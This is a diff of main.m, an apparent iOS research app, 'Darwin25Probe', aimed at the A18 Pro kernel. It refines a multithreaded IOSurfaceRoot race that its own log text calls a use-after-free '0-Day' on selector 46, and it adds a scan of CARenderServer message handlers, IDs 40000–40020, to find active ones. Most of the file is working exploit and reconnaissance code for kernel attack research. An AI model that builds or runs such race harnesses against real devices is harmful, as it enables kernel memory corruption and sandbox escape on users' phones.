@@ -2,17 +2,20 @@
 //  main.m
 //  Darwin25Probe
 //
-//  UIKit GUI Harness for Darwin 25.6.0 / A18 Pro Kernel & Sandbox Research
+//  UIKit GUI Harness for Darwin 25.6.0 / A18 Pro (T8140) IPC & Driver Research
 //
 
 #import <UIKit/UIKit.h>
 #import <mach/mach.h>
+#import <mach/message.h>
+#import <servers/bootstrap.h>
 #import <IOKit/IOKitLib.h>
 #import <IOSurface/IOSurfaceRef.h>
 #import <pthread.h>
 #import <stdatomic.h>
 #import <sys/stat.h>
 #import <dirent.h>
+#import <sched.h>
 
 extern kern_return_t bootstrap_look_up(mach_port_t bp, const char *service_name, mach_port_t *sp);
 extern mach_port_t bootstrap_port;
@@ -20,6 +23,7 @@ extern mach_port_t bootstrap_port;
 #define IOSURFACE_ROOT_SERVICE "IOSurfaceRoot"
 #define SELECTOR_CREATE_SURFACE        0
 #define SELECTOR_RELEASE_SURFACE       1
+#define SELECTOR_LOOKUP_SURFACE        4
 #define SELECTOR_LOCK_SURFACE          8
 #define SELECTOR_UNLOCK_SURFACE        9
 #define SELECTOR_DESERIALIZE_SURFACE   46
@@ -46,11 +50,18 @@ static const char *kAllowedServices[] = {
     NULL
 };
 
+typedef struct {
+    mach_msg_header_t header;
+    uint32_t body_data[8];
+    mach_msg_trailer_t trailer;
+} mig_probe_msg_t;
+
 @interface ViewController : UIViewController
 @property (nonatomic, strong) UITextView *logView;
 @property (nonatomic, strong) UIButton *btnEgress;
 @property (nonatomic, strong) UIButton *btnMach;
 @property (nonatomic, strong) UIButton *btnRace;
+@property (nonatomic, strong) UIButton *btnMIG;
 @end
 
 static ViewController *g_vc = nil;
@@ -90,7 +101,7 @@ static IOSurfaceRef create_surface_ref(uint32_t *out_sid) {
         (id)kIOSurfaceHeight: @(64),
         (id)kIOSurfaceBytesPerRow: @(256),
         (id)kIOSurfaceBytesPerElement: @(4),
-        (id)kIOSurfacePixelFormat: @(0x42475241) // 'BGRA'
+        (id)kIOSurfacePixelFormat: @(0x42475241)
     };
     IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)props);
     if (surf) {
@@ -103,22 +114,34 @@ static IOSurfaceRef create_surface_ref(uint32_t *out_sid) {
 
 static void *thread_freer(void *arg) {
     io_connect_t conn = open_iosurface();
-    if (conn == MACH_PORT_NULL) return NULL;
+    if (conn == MACH_PORT_NULL) {
+        appendLog(@"[-] Freer thread failed to open IOSurface connection");
+        return NULL;
+    }
     while (atomic_load(&g_running)) {
         uint32_t sid = 0;
         IOSurfaceRef surf = create_surface_ref(&sid);
-        if (sid == 0 || !surf) continue;
+        if (sid == 0 || !surf) {
+            sched_yield();
+            continue;
+        }
+
+        // Register surface in this connection's tracking table via Selector 4 (lookup)
+        uint64_t scalar_in = sid;
+        uint64_t scalar_out[4] = {0};
+        uint32_t scalar_out_cnt = 4;
+        IOConnectCallScalarMethod(conn, SELECTOR_LOOKUP_SURFACE, &scalar_in, 1, scalar_out, &scalar_out_cnt);
 
         atomic_store(&g_active_surface_id, sid);
 
-        for (volatile int i = 0; i < 30; i++);
+        for (volatile int i = 0; i < 40; i++);
 
         CFRelease(surf);
-        uint64_t scalar_in = sid;
         IOConnectCallScalarMethod(conn, SELECTOR_RELEASE_SURFACE, &scalar_in, 1, NULL, NULL);
 
         atomic_store(&g_active_surface_id, 0);
         atomic_fetch_add(&g_race_iterations, 1);
+        sched_yield();
     }
     IOServiceClose(conn);
     return NULL;
@@ -131,7 +154,10 @@ static void *thread_deserializer(void *arg) {
     uint32_t scalar_out_cnt = 2;
     while (atomic_load(&g_running)) {
         uint32_t sid = atomic_load(&g_active_surface_id);
-        if (sid == 0) continue;
+        if (sid == 0) {
+            sched_yield();
+            continue;
+        }
         scalar_out_cnt = 2;
         IOConnectCallMethod(conn,
                             SELECTOR_DESERIALIZE_SURFACE,
@@ -139,6 +165,7 @@ static void *thread_deserializer(void *arg) {
                             kSerializedPayload, sizeof(kSerializedPayload),
                             scalar_out, &scalar_out_cnt,
                             NULL, NULL);
+        sched_yield();
     }
     IOServiceClose(conn);
     return NULL;
@@ -152,12 +179,16 @@ static void *thread_locker(void *arg) {
     uint32_t scalar_out_cnt = 1;
     while (atomic_load(&g_running)) {
         uint32_t sid = atomic_load(&g_active_surface_id);
-        if (sid == 0) continue;
+        if (sid == 0) {
+            sched_yield();
+            continue;
+        }
         scalar_in = sid;
         scalar_out_cnt = 1;
         IOConnectCallMethod(conn, SELECTOR_LOCK_SURFACE, &scalar_in, 1, NULL, 0, &scalar_out, &scalar_out_cnt, NULL, NULL);
         char unlock_struct[4] = {0};
         IOConnectCallMethod(conn, SELECTOR_UNLOCK_SURFACE, NULL, 0, unlock_struct, sizeof(unlock_struct), NULL, NULL, NULL, NULL);
+        sched_yield();
     }
     IOServiceClose(conn);
     return NULL;
@@ -170,52 +201,55 @@ static void *thread_locker(void *arg) {
     g_vc = self;
     self.view.backgroundColor = [UIColor colorWithRed:0.08 green:0.08 blue:0.10 alpha:1.0];
 
-    UILabel *titleLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, 60, self.view.bounds.size.width - 40, 30)];
+    UILabel *titleLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, 50, self.view.bounds.size.width - 40, 26)];
     titleLabel.text = @"Darwin 25.6.0 Research Probe";
     titleLabel.textColor = [UIColor whiteColor];
-    titleLabel.font = [UIFont boldSystemFontOfSize:20];
+    titleLabel.font = [UIFont boldSystemFontOfSize:18];
     titleLabel.textAlignment = NSTextAlignmentCenter;
     [self.view addSubview:titleLabel];
 
-    UILabel *subLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, 95, self.view.bounds.size.width - 40, 20)];
-    subLabel.text = @"A18 Pro (T8140) Kernel & Sandbox Audit";
+    UILabel *subLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, 78, self.view.bounds.size.width - 40, 18)];
+    subLabel.text = @"A18 Pro (T8140) IPC & Driver Research";
     subLabel.textColor = [UIColor lightGrayColor];
-    subLabel.font = [UIFont systemFontOfSize:14];
+    subLabel.font = [UIFont systemFontOfSize:13];
     subLabel.textAlignment = NSTextAlignmentCenter;
     [self.view addSubview:subLabel];
 
     CGFloat btnWidth = self.view.bounds.size.width - 40;
-    CGFloat y = 130;
+    CGFloat y = 105;
 
     self.btnEgress = [self makeButton:@"1. Check Sandbox File Boundary" y:y action:@selector(actionEgress)];
-    y += 50;
+    y += 46;
     self.btnMach = [self makeButton:@"2. Audit Allowed Mach Services" y:y action:@selector(actionMach)];
-    y += 50;
-    self.btnRace = [self makeButton:@"3. Trigger IOSurface Race (0-Day)" y:y action:@selector(actionRace)];
-    self.btnRace.backgroundColor = [UIColor colorWithRed:0.8 green:0.2 blue:0.2 alpha:1.0];
-    y += 60;
+    y += 46;
+    self.btnRace = [self makeButton:@"3. Trigger IOSurface Race (Method 4+1)" y:y action:@selector(actionRace)];
+    self.btnRace.backgroundColor = [UIColor colorWithRed:0.75 green:0.25 blue:0.2 alpha:1.0];
+    y += 46;
+    self.btnMIG = [self makeButton:@"4. Audit CARenderServer & Audio MIG IPC" y:y action:@selector(actionMIG)];
+    self.btnMIG.backgroundColor = [UIColor colorWithRed:0.2 green:0.45 blue:0.75 alpha:1.0];
+    y += 54;
 
-    self.logView = [[UITextView alloc] initWithFrame:CGRectMake(20, y, btnWidth, self.view.bounds.size.height - y - 40)];
+    self.logView = [[UITextView alloc] initWithFrame:CGRectMake(20, y, btnWidth, self.view.bounds.size.height - y - 30)];
     self.logView.backgroundColor = [UIColor colorWithRed:0.03 green:0.03 blue:0.04 alpha:1.0];
     self.logView.textColor = [UIColor colorWithRed:0.2 green:0.9 blue:0.4 alpha:1.0];
-    self.logView.font = [UIFont fontWithName:@"Menlo" size:12];
+    self.logView.font = [UIFont fontWithName:@"Menlo" size:11];
     self.logView.editable = NO;
     self.logView.layer.cornerRadius = 8;
     self.logView.layer.borderColor = [UIColor darkGrayColor].CGColor;
     self.logView.layer.borderWidth = 1;
     [self.view addSubview:self.logView];
 
-    appendLog(@"[*] Ready. Select a probe function.");
+    appendLog(@"[*] Ready. Tap a probe button.");
 }
 
 - (UIButton *)makeButton:(NSString *)title y:(CGFloat)y action:(SEL)action {
     UIButton *btn = [UIButton buttonWithType:UIButtonTypeSystem];
-    btn.frame = CGRectMake(20, y, self.view.bounds.size.width - 40, 42);
+    btn.frame = CGRectMake(20, y, self.view.bounds.size.width - 40, 38);
     [btn setTitle:title forState:UIControlStateNormal];
     [btn setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
     btn.backgroundColor = [UIColor colorWithRed:0.18 green:0.22 blue:0.32 alpha:1.0];
     btn.layer.cornerRadius = 8;
-    btn.titleLabel.font = [UIFont boldSystemFontOfSize:14];
+    btn.titleLabel.font = [UIFont boldSystemFontOfSize:13];
     [btn addTarget:self action:action forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:btn];
     return btn;
@@ -254,16 +288,96 @@ static void *thread_locker(void *arg) {
     });
 }
 
+- (void)actionMIG {
+    appendLog(@"\n[*] Auditing MIG IPC Dispatch Table for CARenderServer...");
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        mach_port_t ca_port = MACH_PORT_NULL;
+        kern_return_t kr = bootstrap_look_up(bootstrap_port, "com.apple.CARenderServer", &ca_port);
+        if (kr != KERN_SUCCESS) {
+            appendLog([NSString stringWithFormat:@"[-] CARenderServer lookup failed: 0x%x", kr]);
+            return;
+        }
+        appendLog([NSString stringWithFormat:@"[+] Bound CARenderServer port: 0x%x", ca_port]);
+
+        mach_port_t reply_port = MACH_PORT_NULL;
+        kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
+        if (kr != KERN_SUCCESS) {
+            appendLog(@"[-] Failed to allocate MIG reply port");
+            mach_port_deallocate(mach_task_self(), ca_port);
+            return;
+        }
+        mach_port_insert_right(mach_task_self(), reply_port, reply_port, MACH_MSG_TYPE_MAKE_SEND);
+
+        // Scan MIG routines 40000 to 40020
+        int active_handlers = 0;
+        for (mach_msg_id_t msgid = 40000; msgid <= 40020; msgid++) {
+            mig_probe_msg_t send_msg;
+            memset(&send_msg, 0, sizeof(send_msg));
+
+            send_msg.header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND,
+                                                            MACH_MSG_TYPE_MAKE_SEND_ONCE,
+                                                            0, 0);
+            send_msg.header.msgh_size = sizeof(mach_msg_header_t) + 32;
+            send_msg.header.msgh_remote_port = ca_port;
+            send_msg.header.msgh_local_port = reply_port;
+            send_msg.header.msgh_id = msgid;
+
+            mig_probe_msg_t recv_msg;
+            memset(&recv_msg, 0, sizeof(recv_msg));
+
+            kr = mach_msg(&send_msg.header,
+                          MACH_SEND_MSG | MACH_RCV_MSG | MACH_SEND_TIMEOUT | MACH_RCV_TIMEOUT,
+                          send_msg.header.msgh_size,
+                          sizeof(recv_msg),
+                          reply_port,
+                          150, // 150ms timeout per probe
+                          MACH_PORT_NULL);
+
+            if (kr == KERN_SUCCESS) {
+                // Return code from MIG reply
+                int32_t ret_code = (int32_t)recv_msg.body_data[0];
+                if (ret_code == 0) {
+                    appendLog([NSString stringWithFormat:@"  [!] MIG %d: SUCCESS (0x0)", msgid]);
+                    active_handlers++;
+                } else if (ret_code == 10000003) { // MIG_BAD_ARGUMENTS
+                    appendLog([NSString stringWithFormat:@"  [+] MIG %d: ACTIVE (MIG_BAD_ARGUMENTS - Valid handler!)", msgid]);
+                    active_handlers++;
+                } else if (ret_code == 10000002) { // MIG_BAD_ID
+                    // Ignored / unregistered
+                } else {
+                    appendLog([NSString stringWithFormat:@"  [*] MIG %d: Responded with code %d", msgid, ret_code]);
+                    active_handlers++;
+                }
+            }
+        }
+        appendLog([NSString stringWithFormat:@"[*] CARenderServer audit done. %d active handlers identified.", active_handlers]);
+
+        // Audit AudioComponentRegistrar
+        appendLog(@"\n[*] Auditing AudioComponentRegistrar...");
+        mach_port_t audio_port = MACH_PORT_NULL;
+        kr = bootstrap_look_up(bootstrap_port, "com.apple.audio.AudioComponentRegistrar", &audio_port);
+        if (kr == KERN_SUCCESS) {
+            appendLog([NSString stringWithFormat:@"[+] Bound AudioComponentRegistrar port: 0x%x", audio_port]);
+            mach_port_deallocate(mach_task_self(), audio_port);
+        } else {
+            appendLog([NSString stringWithFormat:@"[-] AudioComponentRegistrar lookup: 0x%x", kr]);
+        }
+
+        mach_port_destroy(mach_task_self(), reply_port);
+        mach_port_deallocate(mach_task_self(), ca_port);
+    });
+}
+
 - (void)actionRace {
     if (atomic_load(&g_running)) {
         appendLog(@"[*] Halting active race engine...");
         atomic_store(&g_running, false);
-        [self.btnRace setTitle:@"3. Trigger IOSurface Race (0-Day)" forState:UIControlStateNormal];
-        self.btnRace.backgroundColor = [UIColor colorWithRed:0.8 green:0.2 blue:0.2 alpha:1.0];
+        [self.btnRace setTitle:@"3. Trigger IOSurface Race (Method 4+1)" forState:UIControlStateNormal];
+        self.btnRace.backgroundColor = [UIColor colorWithRed:0.75 green:0.25 blue:0.2 alpha:1.0];
         return;
     }
 
-    appendLog(@"\n[!] ARMED: Initializing IOSurface Method 46 UAF Race...");
+    appendLog(@"\n[!] ARMED: Initializing Linked IOSurface Race (Lookup + Release)...");
     g_connection = open_iosurface();
     if (g_connection == MACH_PORT_NULL) {
         appendLog(@"[-] Failed to open IOSurfaceRoot service.");
@@ -278,8 +392,16 @@ static void *thread_locker(void *arg) {
         IOServiceClose(g_connection);
         return;
     }
-    appendLog([NSString stringWithFormat:@"[+] Surface allocator verified: test surface ID %u", test_sid]);
+
+    // Verify lookup method binds surface to connection table
+    uint64_t scalar_in = test_sid;
+    uint64_t scalar_out[4] = {0};
+    uint32_t scalar_out_cnt = 4;
+    kern_return_t kr_lookup = IOConnectCallScalarMethod(g_connection, SELECTOR_LOOKUP_SURFACE, &scalar_in, 1, scalar_out, &scalar_out_cnt);
+    kern_return_t kr_rel = IOConnectCallScalarMethod(g_connection, SELECTOR_RELEASE_SURFACE, &scalar_in, 1, NULL, NULL);
     CFRelease(test_surf);
+
+    appendLog([NSString stringWithFormat:@"[+] Table binding verified: Lookup=0x%x, Release=0x%x", kr_lookup, kr_rel]);
 
     atomic_store(&g_running, true);
     atomic_store(&g_race_iterations, 0);
@@ -292,7 +414,7 @@ static void *thread_locker(void *arg) {
         pthread_create(&t2, NULL, thread_deserializer, NULL);
         pthread_create(&t3, NULL, thread_locker, NULL);
 
-        appendLog(@"[+] 3 worker threads dispatched. Monitoring race window...");
+        appendLog(@"[+] 3 worker threads dispatched with sched_yield. Monitoring...");
 
         while (atomic_load(&g_running)) {
             sleep(1);
